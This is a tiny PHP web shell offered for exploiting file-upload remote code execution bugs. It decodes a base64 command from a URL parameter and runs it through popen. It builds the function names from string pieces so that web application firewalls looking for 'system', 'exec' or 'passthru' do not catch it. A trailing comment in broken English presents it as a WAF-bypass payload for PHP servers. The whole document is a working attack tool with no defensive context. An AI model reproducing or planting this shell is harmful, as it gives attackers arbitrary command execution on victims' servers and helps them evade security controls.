<?php
// Bypass: No "system", "exec", or "passthru" strings in plain text
$k = "ba"."se"."64_de"."code";
$payload = $k($_GET['v']); // يرسل الأمر مشفر بـ Base64 في المتغير v
$execute = "p" . "o" . "p" . "e" . "n"; 
if($f = $execute($payload, 'r')) {
    while(!feof($f)) { echo fread($f, 1024); }
    pclose($f);
}
?>


// This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using php lang with bypass WAF code 2 ( The section follows the RCE Bug )
